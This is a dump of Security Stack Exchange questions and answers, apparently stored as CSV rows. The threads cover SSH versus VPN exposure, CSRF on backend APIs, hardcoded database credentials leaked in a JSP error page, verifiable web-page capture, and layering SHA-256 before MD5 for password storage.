<li><p>Both are secured using the same type and same length keys (e.g. 4096 bit RSA).</p>
</li>
<li><p>Both are running the services on ports that are publicly accessible.</p>
</li>
<li><p>Each is running the latest version of OpenSSH and OpenVPN respectively, which have no known vulnerabilities.</p>
</li>
<li><p>Both servers employ hardened configurations.  In the case of the OpenSSH server, OpenSSH has been hardened to only allow key-based authentication (not password-based authentication), to not allow root logins, etc.</p>
</li>
</ul>
<p>Barring a zero-day vulnerability in OpenSSH or OpenVPN or side-channel attacks - it is hard to see how either one could be any more or less secure than the other, in as much as allowing an attacker unauthorized access to the server.</p>
","1"
"259599","259599","Is a backend API server vulnerable to CSRF?","<p>We recently ran a Veracode SAST scan on our application and discovered that it has a CSRF. However, I wanted to check whether this is really true or it's just a false positive.</p>
<ol>
<li>Our application is a pure backend server. Serving JSON APIs to the users.</li>
<li>Users will be calling these APIs from their backend in 99.99% of the cases. That means they will not be calling these APIs directly. Some HTTP Client/Application/SDK will be used.</li>
<li>We cannot control the client side of the application.</li>
</ol>
<p>These are the three constraints in which our application is going to be used. Now, my question is, does this make the application safe from CSRF and can we go ahead and mark this flaw as false positive?</p>
","9","4","259603","<blockquote>
<p>Our application is a pure backend server. Serving JSON APIs to the users.<br>
Users will be calling these APIs from their backend in 99.99% of the cases. <br>...</p>
</blockquote>
<p><strong>It does not matter what the API is serving or how the user is supposed to call the API.</strong> Attackers don't care about how something is supposed to be used but typically rely on not intended functionality.</p>
<p>If authentication credentials are automatically sent and no cross-origin detection or protection is done, then an authenticated client can be tricked into making in authenticated requests controlled by the attacker.</p>
<p>Authentication credentials are automatically sent with cross-origin requests when basic authentication is used or cookies - although many modern browsers nowadays limit the problem by making cookies same-site by default. Other automatically sent authentication methods are client certificates or Kerberos resp. NTLM tickets.
If the attacker can induce the client to make such a request then the attacker does not need to actually know the authentication information - the client will add these by its own to the request.</p>
<p>Sometimes &quot;authentication&quot; does not rely on specific credentials but simply allows anything which comes from specific IP addresses or network. While a cross-origin request is triggered from &quot;outside&quot; it is using the clients browser to actually do the requests which thus comes from &quot;inside&quot; and is treated as authenticated.</p>
<p>If the API instead relies on something like an authentication token which explicitly needs to be added to each request, then the attacker would need to know the authentication credentials and cannot blindly trigger an authenticated request. In this case CSRF would not be doable.</p>
<p>Similar if the API requires requests which are not <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests"" rel=""noreferrer"">simple</a> for example by requiring special HTTP headers, then CSRF can not be done unless the site employs a weak (non-default) CORS setup.</p>
<blockquote>
<p>can we go ahead and mark this flaw as false positive?</p>
</blockquote>
<p>Too few is known about your actual API to decide on this.</p>
","18"
"259599","259599","Is a backend API server vulnerable to CSRF?","<p>We recently ran a Veracode SAST scan on our application and discovered that it has a CSRF. However, I wanted to check whether this is really true or it's just a false positive.</p>
<ol>
<li>Our application is a pure backend server. Serving JSON APIs to the users.</li>
<li>Users will be calling these APIs from their backend in 99.99% of the cases. That means they will not be calling these APIs directly. Some HTTP Client/Application/SDK will be used.</li>
<li>We cannot control the client side of the application.</li>
</ol>
<p>These are the three constraints in which our application is going to be used. Now, my question is, does this make the application safe from CSRF and can we go ahead and mark this flaw as false positive?</p>
","9","4","259607","<p>If your API server uses cookies (or HTTP Basic/Digest/Kerberos) for authentication, then you need anti-CSRF measures. Even if you don't expect a web browser to be used with it, somebody could do so (as you say, you don't control the client). Additionally, some things that aren't browsers are browser-like in their behavior (e.g. webviews in mobile or desktop apps), and those are also at risk.</p>
<p>If you don't actually use any credentials that are sent automatically by browsers (cookies, HTTP auth, sometimes TLS client certs), then you aren't actually vulnerable to CSRF and can dismiss the finding as a false positive.</p>
","8"
"259599","259599","Is a backend API server vulnerable to CSRF?","<p>We recently ran a Veracode SAST scan on our application and discovered that it has a CSRF. However, I wanted to check whether this is really true or it's just a false positive.</p>
<ol>
<li>Our application is a pure backend server. Serving JSON APIs to the users.</li>
<li>Users will be calling these APIs from their backend in 99.99% of the cases. That means they will not be calling these APIs directly. Some HTTP Client/Application/SDK will be used.</li>
<li>We cannot control the client side of the application.</li>
</ol>
<p>These are the three constraints in which our application is going to be used. Now, my question is, does this make the application safe from CSRF and can we go ahead and mark this flaw as false positive?</p>
","9","4","259646","<p>CORS only matter when embedding API content on another sites' frontend, or some <code>WebView</code>; while CSRF generally just makes sure, that the form which is being posted had been recently loaded from the same server. While I find it difficult to see the actual attack vector, when the communication is server to server. The <a href=""https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"" rel=""nofollow noreferrer"">XSS cheatsheet</a> should confirm this claim.</p>
","2"
"259599","259599","Is a backend API server vulnerable to CSRF?","<p>We recently ran a Veracode SAST scan on our application and discovered that it has a CSRF. However, I wanted to check whether this is really true or it's just a false positive.</p>
<ol>
<li>Our application is a pure backend server. Serving JSON APIs to the users.</li>
<li>Users will be calling these APIs from their backend in 99.99% of the cases. That means they will not be calling these APIs directly. Some HTTP Client/Application/SDK will be used.</li>
<li>We cannot control the client side of the application.</li>
</ol>
<p>These are the three constraints in which our application is going to be used. Now, my question is, does this make the application safe from CSRF and can we go ahead and mark this flaw as false positive?</p>
","9","4","259663","<p>Same issue I also got while doing SAST scan, even in my case have disabled csrf through spring security. But we know that our rest api needs an authentication token each time we access it. In my opinion csrf attack would not be possible here.</p>
","1"
"259569","259569","Backend database username and password revealed in JSP Page","<p><a href=""https://i.stack.imgur.com/7CaNh.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7CaNh.jpg"" alt=""http 500 error"" /></a></p>
<p>Recently I came across a website and when clicking on one of hyperlinks it displayed a HTTP 500 error page as shown in the image, which indicated that it is using Java Server Pages and on line 23 the code read as</p>
<pre><code>Connection con = Drivermanager.getconnection(conStr,&quot;some_username&quot;,&quot;some_password&quot;); 
</code></pre>
<ol>
<li>Have they hardcoded the <strong>username</strong> and <strong>password</strong> on the JSP page?</li>
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
<li>What is the best way to prevent such instances besides following OWASP Top 10?</li>
<li>Is this DB publicly accessible now?</li>
</ol>
","22","6","259571","<p>They have quite obviously hardcoded the Oracle database credentials.</p>
<p>Unless the database is exposed to the internet, there is nothing in what you have shown that allows you to directly connect to the database. But connecting is not necessary. <em>They have exposed their credentials</em>. That's enough.</p>
<p>Credentials should be stored in another location and called as part of the connection string.</p>
","38"
"259569","259569","Backend database username and password revealed in JSP Page","<p><a href=""https://i.stack.imgur.com/7CaNh.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7CaNh.jpg"" alt=""http 500 error"" /></a></p>
<p>Recently I came across a website and when clicking on one of hyperlinks it displayed a HTTP 500 error page as shown in the image, which indicated that it is using Java Server Pages and on line 23 the code read as</p>
<pre><code>Connection con = Drivermanager.getconnection(conStr,&quot;some_username&quot;,&quot;some_password&quot;); 
</code></pre>
<ol>
<li>Have they hardcoded the <strong>username</strong> and <strong>password</strong> on the JSP page?</li>
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
<li>What is the best way to prevent such instances besides following OWASP Top 10?</li>
<li>Is this DB publicly accessible now?</li>
</ol>
","22","6","259576","<blockquote>
<p>Have they hardcoded the username and password on the JSP page?</p>
</blockquote>
<p>Yes, they did.</p>
<blockquote>
<p>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</p>
</blockquote>
<p>No need to test anything. It's right on the source code of the site, so I doubt any further proof is necessary.</p>
<blockquote>
<p>What is the best way to prevent such instances besides following OWASP Top 10?</p>
</blockquote>
<p>There are some relevant OWASP entries:</p>
<p><a href=""https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"" rel=""noreferrer"">Security Misconfiguration</a>: a production server should not be configured in such a way that errors with debug messages got sent to the clients. This allows an attacker to enumerate products, versions, and possible vulnerabilities. In this specific case, even database access credentials.</p>
<p><a href=""https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"" rel=""noreferrer"">Software and Data Integrity Failures</a>: &quot;Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations.&quot;</p>
<p>Database access should be handled by a software component (for the lack of better definition) that should handle, among other things, exception handling and log generation. In this case, there's no exception handling at all and the log is sent to the client.</p>
<p><a href=""https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"" rel=""noreferrer"">Identification and Authentication Failures</a>: &quot;Uses plain text, encrypted, or weakly hashed passwords data stores.&quot;</p>
<p><a href=""https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"" rel=""noreferrer"">Cryptographic Failures</a>: &quot;... previously known as Sensitive Data Exposure, which is more of a broad symptom rather than a root cause, the focus is on failures related to cryptography (or lack thereof). Which often lead to exposure of sensitive data. Notable Common Weakness Enumerations (CWEs) included are CWE-259: Use of Hard-coded Password, CWE-327: Broken or Risky Crypto Algorithm, and CWE-331 Insufficient Entropy.&quot;</p>
<p>In this case, <em>CWE-259: Use of Hard-coded Password</em> applies. It's more a sensitive data exposure than a cryptographic failure, but it's a failure anyway.</p>
<blockquote>
<p>Is this DB publicly accessible now?</p>
</blockquote>
<p>It depends. They leaked the username and password, so if someone manages to get network access (remote file inclusion, remote code execution, server-side request forgery, etc) it's possible to connect direct to the database.</p>
<p>This could be development code ending up in production, but this does not lower the severity of the issue. If this is the case, it shows the company does not have proper software lifetime standards in place, or don't even have development/staging/production environments.</p>
","15"
"259569","259569","Backend database username and password revealed in JSP Page","<p><a href=""https://i.stack.imgur.com/7CaNh.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7CaNh.jpg"" alt=""http 500 error"" /></a></p>
<p>Recently I came across a website and when clicking on one of hyperlinks it displayed a HTTP 500 error page as shown in the image, which indicated that it is using Java Server Pages and on line 23 the code read as</p>
<pre><code>Connection con = Drivermanager.getconnection(conStr,&quot;some_username&quot;,&quot;some_password&quot;); 
</code></pre>
<ol>
<li>Have they hardcoded the <strong>username</strong> and <strong>password</strong> on the JSP page?</li>
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
<li>What is the best way to prevent such instances besides following OWASP Top 10?</li>
<li>Is this DB publicly accessible now?</li>
</ol>
","22","6","259583","<p>This is not good practice on a number of levels:</p>
<ol>
<li>Hardcoding credentials in your code</li>
<li>Exposing error info to the web</li>
<li>Using &quot;magic&quot; strings in code, rather than variables.</li>
</ol>
<p>All of which should be avoided! Good programming practise alone might have mitigated this somewhat as the password/username would be references to variables, not raw strings. But there's lots of things wrong here.</p>
","2"
"259569","259569","Backend database username and password revealed in JSP Page","<p><a href=""https://i.stack.imgur.com/7CaNh.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7CaNh.jpg"" alt=""http 500 error"" /></a></p>
<p>Recently I came across a website and when clicking on one of hyperlinks it displayed a HTTP 500 error page as shown in the image, which indicated that it is using Java Server Pages and on line 23 the code read as</p>
<pre><code>Connection con = Drivermanager.getconnection(conStr,&quot;some_username&quot;,&quot;some_password&quot;); 
</code></pre>
<ol>
<li>Have they hardcoded the <strong>username</strong> and <strong>password</strong> on the JSP page?</li>
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
<li>What is the best way to prevent such instances besides following OWASP Top 10?</li>
<li>Is this DB publicly accessible now?</li>
</ol>
","22","6","259586","<p>Looks like you hit some forgotten debug code that doesn't work, probably exactly because the exposed connection credentials are not valid.</p>
<p>The credentials may be valid for some development database or not relevant to anything anymore.</p>
<p>While still a result of some bad practice (the debug code should not be left in the production setup and the error messages should go into some log infrastructure and not expose the code to the end user), it likely doesn't expose something sensitive.</p>
<p>The exposed part of the program code is fairly generic as well.</p>
","-2"
"259569","259569","Backend database username and password revealed in JSP Page","<p><a href=""https://i.stack.imgur.com/7CaNh.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7CaNh.jpg"" alt=""http 500 error"" /></a></p>
<p>Recently I came across a website and when clicking on one of hyperlinks it displayed a HTTP 500 error page as shown in the image, which indicated that it is using Java Server Pages and on line 23 the code read as</p>
<pre><code>Connection con = Drivermanager.getconnection(conStr,&quot;some_username&quot;,&quot;some_password&quot;); 
</code></pre>
<ol>
<li>Have they hardcoded the <strong>username</strong> and <strong>password</strong> on the JSP page?</li>
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
<li>What is the best way to prevent such instances besides following OWASP Top 10?</li>
<li>Is this DB publicly accessible now?</li>
</ol>
","22","6","259660","<p>I would add to the other answers and point out that the method of connecting to the database being used in this instance is incorrect.</p>
<p>Java EE based systems, access to resources should be provided and managed by the application server (or web container in cases like Tomcat or jetty)  i.e. you don't connect to anything directly, you configure the application server to connect then the application looks up the connection in JNDI</p>
<p>Their code would be looking up a Datasource Object which is already connected, hence the application would not deal directly with the credentials at all.</p>
<p>Generally, the Application Server or Web Container will use an alias for the credential in its config and store the credential values in a Keystore alongside any Private Keys for example.</p>
","0"
"259569","259569","Backend database username and password revealed in JSP Page","<p><a href=""https://i.stack.imgur.com/7CaNh.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7CaNh.jpg"" alt=""http 500 error"" /></a></p>
<p>Recently I came across a website and when clicking on one of hyperlinks it displayed a HTTP 500 error page as shown in the image, which indicated that it is using Java Server Pages and on line 23 the code read as</p>
<pre><code>Connection con = Drivermanager.getconnection(conStr,&quot;some_username&quot;,&quot;some_password&quot;); 
</code></pre>
<ol>
<li>Have they hardcoded the <strong>username</strong> and <strong>password</strong> on the JSP page?</li>
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
<li>What is the best way to prevent such instances besides following OWASP Top 10?</li>
<li>Is this DB publicly accessible now?</li>
</ol>
","22","6","259669","<blockquote>
<ol start=""2"">
<li>Before submitting the bug to the site owner, how can I test the information exposure and &quot;exploit&quot;?</li>
</ol>
</blockquote>
<p>You don't.  If you login to the database and check out the information exposure to 'test' it, you are basically accessing it without authorization which is a crime.</p>
","1"
"259446","259446","Verifiable alternative to screenshots for web browsers","<p>Screenshots are generally held to be dubious evidence when presented in court because they are <a href=""https://prodigital4n6.com/screen-shots-are-not-evidence/"" rel=""nofollow noreferrer"">susceptible to alteration</a>, especially when it comes to pages rendered in web browsers.  You can use the browser's dev tools to <a href=""https://www.howtogeek.com/347188/stupid-geek-tricks-how-to-fake-a-web-page-screenshot-without-photoshop/"" rel=""nofollow noreferrer"">alter the content</a>, you can modify the resulting image with MS Paint, you can even be victim to an elaborate MITM attack because you trusted a bad CA.</p>
<p>There are myriad reasons to want non-repudiation and integrity verification for web content.  Some people turn to sources like the Wayback Machine, but they have sparse snapshots, and they are unable to record dynamic, per-user content.</p>
<p><strong>Are there tools available to verifiably claim &quot;This is the webpage that was served to me&quot;?</strong>  Is such a tool even possible on a web client?</p>
<p>Such a tool would need to verify</p>
<ol>
<li>The page's contents</li>
<li>Who served the page in question.</li>
<li>The page's contents were not modified in transit (eliminate MITM)</li>
<li>The tool itself was not tampered with</li>
</ol>
<p>Requirement 4 alone makes me think that client-side verification tools are impossible, making necessary an external service like a proxy.</p>
<p>Do such services exist?</p>
","1","3","259449","<p>Such tools would not be able to run on a client since a common client (PC, phone) is not sufficiently trusted for this - the (potentially cheating) user has too much control of the device.</p>
<p>It might be possible for a commonly accepted trusted third party (i.e. a notary) to run a service where users submit a URL and get back some signed container (like a PDF) which contains the image, the URL, a timestamp etc.</p>
<p>The technology for this exists, but I'm not aware of such a service - maybe because it might not be a profitable business model. The approach also has limitations since it can only prove things the service actually has access to, i.e. mostly public content not specific to any user or to any location of access. It can also not prove that the content was actually delivered to the specific user, only that the content was served to the service.</p>
","2"
"259446","259446","Verifiable alternative to screenshots for web browsers","<p>Screenshots are generally held to be dubious evidence when presented in court because they are <a href=""https://prodigital4n6.com/screen-shots-are-not-evidence/"" rel=""nofollow noreferrer"">susceptible to alteration</a>, especially when it comes to pages rendered in web browsers.  You can use the browser's dev tools to <a href=""https://www.howtogeek.com/347188/stupid-geek-tricks-how-to-fake-a-web-page-screenshot-without-photoshop/"" rel=""nofollow noreferrer"">alter the content</a>, you can modify the resulting image with MS Paint, you can even be victim to an elaborate MITM attack because you trusted a bad CA.</p>
<p>There are myriad reasons to want non-repudiation and integrity verification for web content.  Some people turn to sources like the Wayback Machine, but they have sparse snapshots, and they are unable to record dynamic, per-user content.</p>
<p><strong>Are there tools available to verifiably claim &quot;This is the webpage that was served to me&quot;?</strong>  Is such a tool even possible on a web client?</p>
<p>Such a tool would need to verify</p>
<ol>
<li>The page's contents</li>
<li>Who served the page in question.</li>
<li>The page's contents were not modified in transit (eliminate MITM)</li>
<li>The tool itself was not tampered with</li>
</ol>
<p>Requirement 4 alone makes me think that client-side verification tools are impossible, making necessary an external service like a proxy.</p>
<p>Do such services exist?</p>
","1","3","259455","<p>There is a question of trust here. As soon as you are the only provider for a document, you cannot prove that it is authentic because you could as well have forged it. So it can only be a hint that <em>things could have gone that way</em>. The only communication equipment I can remember with a kind of legal value was the good old <a href=""https://en.wikipedia.org/wiki/Telex"" rel=""nofollow noreferrer"">Telex</a>, yes the one at 50 bauds and ITT2 alphabet with 5 bits characters.</p>
<p>The main difference with Internet of even facs, is that the teleprinters were connected and identified and provided an technical answerback:</p>
<blockquote>
<p>A major advantage of telex is that the receipt of the message by the recipient could be confirmed with a high degree of certainty by the &quot;answerback&quot;. At the beginning of the message, the sender would transmit a WRU (Who aRe yoU) code, and the recipient machine would automatically initiate a response which was usually encoded in a rotating drum with pegs, much like a music box. The position of the pegs sent an unambiguous identifying code to the sender, so the sender could verify connection to the correct recipient. The WRU code would also be sent at the end of the message, so a correct response would confirm that the connection had remained unbroken during the message transmission. This gave telex a major advantage over group 2 fax, which had no inherent error-checking capability.</p>
</blockquote>
<p>So presenting a continuous paper band with an included message and its answerback was a serious evidence that a message was sent to an identified recipient or received from an identified emitter: the operator could confirm that they did not notice any deconnection at that time, and sender of recievers of previous and following message could confirm that they indeed sent or received those messages at those times.</p>
<p>Nowadays only a digitally signed message can ensure non-repudiation, and they are not commonly used...</p>
","2"
"259446","259446","Verifiable alternative to screenshots for web browsers","<p>Screenshots are generally held to be dubious evidence when presented in court because they are <a href=""https://prodigital4n6.com/screen-shots-are-not-evidence/"" rel=""nofollow noreferrer"">susceptible to alteration</a>, especially when it comes to pages rendered in web browsers.  You can use the browser's dev tools to <a href=""https://www.howtogeek.com/347188/stupid-geek-tricks-how-to-fake-a-web-page-screenshot-without-photoshop/"" rel=""nofollow noreferrer"">alter the content</a>, you can modify the resulting image with MS Paint, you can even be victim to an elaborate MITM attack because you trusted a bad CA.</p>
<p>There are myriad reasons to want non-repudiation and integrity verification for web content.  Some people turn to sources like the Wayback Machine, but they have sparse snapshots, and they are unable to record dynamic, per-user content.</p>
<p><strong>Are there tools available to verifiably claim &quot;This is the webpage that was served to me&quot;?</strong>  Is such a tool even possible on a web client?</p>
<p>Such a tool would need to verify</p>
<ol>
<li>The page's contents</li>
<li>Who served the page in question.</li>
<li>The page's contents were not modified in transit (eliminate MITM)</li>
<li>The tool itself was not tampered with</li>
</ol>
<p>Requirement 4 alone makes me think that client-side verification tools are impossible, making necessary an external service like a proxy.</p>
<p>Do such services exist?</p>
","1","3","259456","<p>Yes, this type of product exists. Both Serge's and Steffan's answers and approaches are correct and their concerns are valid, but there is another way to accomplish &quot;proof&quot; (if you drop the requirement to prove no MITM - that can't happen client-side).</p>
<p>There are systems that can be installed at the kernel level of the OS that take screenshots of every page displayed on a browser and the HTTP request string used. These are signed and stored in a central server. I have seen these in corporate settings for end-user monitoring in certain high-risk contexts.</p>
<p>Since this system is operated as a &quot;normal operation&quot; of the client, these screenshots can be used as supporting evidence for a claim made by the end user (tho perhaps not for claims made by the entity running the evidence collection software, but that's a legal matter).</p>
<p>Is it fool-proof? No. But it provides valid, <em>supporting</em> evidence that can be used to force another party to prove that the evidence is invalid.</p>
<p>So, like Steffan says, it requires a third party, but that third party can be close. It's just that the evidence collection needs to be in the hands of someone else.</p>
","2"
"259408","259408","Is it safe to store a password using a secure hash followed by an insecure hash?","<p>I'm working with some middleware that requires username/password authentication. The middleware uses MD5 hash for the password. The MD5 hash, of course, is not fit for the purpose of storing passwords. We need to address this.</p>
<p>We tried modifying the middleware to use a newer hash but it is a crap system we can't really change easily. However, we can control the web site that sits on top of it, and it's easy to change its code. So one of our developers had this idea:</p>
<ol>
<li><p>When the user registers, the web site generates its own salt, then hashes the password with SHA-256 before passing it to the middleware. The middleware will then hash the password again using MD5 and its own salt.</p>
</li>
<li><p>When the user signs on, the web site retrieves its own salt then attempts to recreate the SHA-256 hash from the password that the user typed in. The web site then passes the SHA-256 hash to the middleware for validation. The middleware retrieves its own salt and attempts to recreate the MD5 hash from the salt and the SHA-256 that was passed in. If they match, the signon attempt is successful.</p>
</li>
</ol>
<p>By combining the hashes in this manner, will my site be as secure as if were using the SHA-256 hash alone? Or does double hashing create some kind of vulnerability?</p>
","27","6","259409","<p>I think it would improve the overall security. The bruteforce throughput of the attacker is now mostly determined by the first stage (salt + SHA-256), not by the fast MD5.</p>
<p>The other factor increasing the security is that if the attacker gets the MD5 database, the inputs are all 256-bit random passwords from SHA-256. No wordlist will have all inputs, and isn't feasible to build a rainbow table for it.</p>
<p>I would not store the salt + SHA-256 anywhere, only the salt. With this, if the database leaks the attacker will have to bruteforce the final result without having the SHA hashes. And I would not use SHA for the first stage, but Argon2 or bcrypt. Save the salt and the difficulty on the database, but not the resulting hash. When the user tries to authenticate, get his password, re-hash it and send the hash to the second stage.</p>
","4"
"259408","259408","Is it safe to store a password using a secure hash followed by an insecure hash?","<p>I'm working with some middleware that requires username/password authentication. The middleware uses MD5 hash for the password. The MD5 hash, of course, is not fit for the purpose of storing passwords. We need to address this.</p>
<p>We tried modifying the middleware to use a newer hash but it is a crap system we can't really change easily. However, we can control the web site that sits on top of it, and it's easy to change its code. So one of our developers had this idea:</p>
<ol>
<li><p>When the user registers, the web site generates its own salt, then hashes the password with SHA-256 before passing it to the middleware. The middleware will then hash the password again using MD5 and its own salt.</p>
</li>
<li><p>When the user signs on, the web site retrieves its own salt then attempts to recreate the SHA-256 hash from the password that the user typed in. The web site then passes the SHA-256 hash to the middleware for validation. The middleware retrieves its own salt and attempts to recreate the MD5 hash from the salt and the SHA-256 that was passed in. If they match, the signon attempt is successful.</p>
</li>
</ol>
<p>By combining the hashes in this manner, will my site be as secure as if were using the SHA-256 hash alone? Or does double hashing create some kind of vulnerability?</p>
","27","6","259410","<p><strong>TLDR:</strong></p>
<p>Yes, this approach can provide good protection.</p>
<p><strong>Details</strong></p>
<p>The weakness of MD5 is weak collision resistance. In your case this means that an attacker will be able to easily find some SHA-256 hash, different from the SHA-256 hash of the real password, that gives the same MD5 hash.</p>
<p>But knowing SHA-256 hash is not sufficient. For SHA-256 hash it is impossible to find neither the preimage (the real password) nor the second preimage (some other password that produces the same hash).</p>
<p>Thus the only way to attack is brute-forcing. The space of SHA-256 hashes is much bigger than the space of MD5 hashes. Computation of SHA-256 has the same order of magnitude as MD5, so it is not crucial and we can think of MD5 only. That's why finding preimage with brute-forcing of MD5(SHA-256()) may be comparable with brute-forcing of MD5, which needs abut ~2<sup>123</sup> operations, which impossible to break now days.</p>
<p>Thus your approach is good for practical purposes.</p>
<p>An important <strong>assumption</strong>: This works for passwords that have <strong>high entropy</strong>. Passwords with low entropy like 40 bits (e.g. 8 chars that are low and upper case plus digits) can be brute-forced relatively fast. If a single GPU computes 10<sup>8</sup> hashes per second, it will brute-force 40-bit password just within a day.</p>
","4"
"259408","259408","Is it safe to store a password using a secure hash followed by an insecure hash?","<p>I'm working with some middleware that requires username/password authentication. The middleware uses MD5 hash for the password. The MD5 hash, of course, is not fit for the purpose of storing passwords. We need to address this.</p>
<p>We tried modifying the middleware to use a newer hash but it is a crap system we can't really change easily. However, we can control the web site that sits on top of it, and it's easy to change its code. So one of our developers had this idea:</p>
<ol>
<li><p>When the user registers, the web site generates its own salt, then hashes the password with SHA-256 before passing it to the middleware. The middleware will then hash the password again using MD5 and its own salt.</p>
</li>
<li><p>When the user signs on, the web site retrieves its own salt then attempts to recreate the SHA-256 hash from the password that the user typed in. The web site then passes the SHA-256 hash to the middleware for validation. The middleware retrieves its own salt and attempts to recreate the MD5 hash from the salt and the SHA-256 that was passed in. If they match, the signon attempt is successful.</p>
</li>
</ol>
<p>By combining the hashes in this manner, will my site be as secure as if were using the SHA-256 hash alone? Or does double hashing create some kind of vulnerability?</p>
","27","6","259411","<p>Adding the website layer <em>might</em> be an improvement, depending on the relative size of the middleware's salt and what else you can do to increase the strength of the website's hashing algorithm - but it's still not great without additional improvement:</p>
<ul>
<li><p>If <strong>the middleware salt is too small</strong>, even just a larger salt at the website SHA256+salt step could be an improvement.</p>
</li>
<li><p>If <strong>the sha256+salt hashing method has additional work factors</strong> (like 100,000 rounds of SHA256 instead of a single round, etc.), then the website SHA256+salt combination has the potential to be an improvement.</p>
</li>
<li><p>But even if the website salt and the middleware salt are <strong>both reasonably large</strong>, if both methods <strong>fail to include stretching or other work factors</strong> ... then <em>both</em> methods are quite bad - and adding the website layer provides no material improved resistance to attack (but does not make it worse).</p>
</li>
</ul>
<p>Note also that your question implies that MD5 is somehow inherently worse than SHA256 for storing hashes, perhaps because &quot;MD5 is broken&quot;. If so, that &quot;breakage&quot; is in the context of finding collisions, and is unrelated to cracking resistance. MD5 <em>is</em> a terrible choice for password storage, but it's not because MD5 is broken - it's because it's a fast hash that was never intended for password storage (and neither was SHA256).</p>
","12"
"259408","259408","Is it safe to store a password using a secure hash followed by an insecure hash?","<p>I'm working with some middleware that requires username/password authentication. The middleware uses MD5 hash for the password. The MD5 hash, of course, is not fit for the purpose of storing passwords. We need to address this.</p>
<p>We tried modifying the middleware to use a newer hash but it is a crap system we can't really change easily. However, we can control the web site that sits on top of it, and it's easy to change its code. So one of our developers had this idea:</p>
<ol>
<li><p>When the user registers, the web site generates its own salt, then hashes the password with SHA-256 before passing it to the middleware. The middleware will then hash the password again using MD5 and its own salt.</p>
</li>
<li><p>When the user signs on, the web site retrieves its own salt then attempts to recreate the SHA-256 hash from the password that the user typed in. The web site then passes the SHA-256 hash to the middleware for validation. The middleware retrieves its own salt and attempts to recreate the MD5 hash from the salt and the SHA-256 that was passed in. If they match, the signon attempt is successful.</p>
</li>
</ol>
<p>By combining the hashes in this manner, will my site be as secure as if were using the SHA-256 hash alone? Or does double hashing create some kind of vulnerability?</p>
","27","6","259412","<p>Yes, combining hashes in this fashion will increase the overall security of password storage on the website, mostly by the use of salted SHA-256 hashing. The final MD5 digest has little effect but does nominally improve security. <strong>However, the described scheme is not very strong</strong>.</p>
<p>The main problem is that if an attacker gains access to the hashed passwords and learns this scheme of password protection they can easily start searching for common passwords and brute forcing the entire set. Because both SHA-256 and MD5 are so cheap to compute it may be feasible to recover several passwords.</p>
<p>SCrypt would be a much better choice than a SHA digest because of relative cost of computation. (BCrypt would be a good choice too but is infeasible due to the final MD5 preventing verification.) Another simple improvement above what is described would be to perform many (thousands) of SHA-256 (or larger) digests to make it cost prohibitive to search the space but not unduly expensive (say, a few hundred milliseconds) to verify a single password.</p>
","33"
"259408","259408","Is it safe to store a password using a secure hash followed by an insecure hash?","<p>I'm working with some middleware that requires username/password authentication. The middleware uses MD5 hash for the password. The MD5 hash, of course, is not fit for the purpose of storing passwords. We need to address this.</p>
<p>We tried modifying the middleware to use a newer hash but it is a crap system we can't really change easily. However, we can control the web site that sits on top of it, and it's easy to change its code. So one of our developers had this idea:</p>
<ol>
<li><p>When the user registers, the web site generates its own salt, then hashes the password with SHA-256 before passing it to the middleware. The middleware will then hash the password again using MD5 and its own salt.</p>
</li>
<li><p>When the user signs on, the web site retrieves its own salt then attempts to recreate the SHA-256 hash from the password that the user typed in. The web site then passes the SHA-256 hash to the middleware for validation. The middleware retrieves its own salt and attempts to recreate the MD5 hash from the salt and the SHA-256 that was passed in. If they match, the signon attempt is successful.</p>
</li>
</ol>
<p>By combining the hashes in this manner, will my site be as secure as if were using the SHA-256 hash alone? Or does double hashing create some kind of vulnerability?</p>
","27","6","259442","<p>What is it you are shielding against? password leaks, or collisions?</p>
<p>The insecurity of MD5 cannot downgrade the security of SHA256, in the sense that you cannot figure out what the password is better, just because you are using the MD5 hash. If this were the case, any attacker could attack any password protected by SHA256 by first putting the hash through MD5, then attack the new hash. This is obviously ridiculous.</p>
<p>But what about collisions? Can a SHA256 followed by MD5 increase the chance of collisions? I believe so, though I can't definitively prove it.</p>
<p>Suppose we have 4 input messages, and 4 possible digests. <code>{ 00, 01, 10, 11 }</code>. Suppose our attacker only gets 1 guess, and we consider a system &quot;secure&quot; if we have a chance of not being cracked greater than 60% or something. Suppose we have an insecure hashing function <code>f(x)</code>, which adds 1 if the input is odd. Even though the cardinality of the output space is 4, we only map to 2 of the options. Suppose we have a secure hashing function <code>g(x)</code> that always adds 1. (I understand neither of these are actually secure since the math is reversible, but bare with me).</p>
<p><code>g(x)</code> maps to all of the output space. So if an attacker were to guess an input, given an output of <code>g(x)</code>, they have a 25% chance of being right. but it's 50% for <code>f(x)</code>. Now consider the two compositions <code>f(g(x))</code> and <code>g(f(x))</code>.</p>
<ul>
<li><code>f(g(x))</code> maps to two outputs, since <code>f(x)</code> is on the outside, so it's insecure.</li>
<li><code>g(f(x))</code> also only maps to two outputs, since f(x) can only pass two options to <code>g(x)</code> in the first place!</li>
</ul>
<p>Either way, the composition of the two functions is not as secure against collisions as g(x) alone.</p>
<p>Now, this is contrived, and it might be the case that MD5 and SHA256 do not interact this way, but I doubt it. If you can find a collision for MD5, does this not indicate it isn't using it's output space as efficiently? So even though I can't <em>prove</em> the composition is insecure, I wouldn't trust it.</p>
","1"
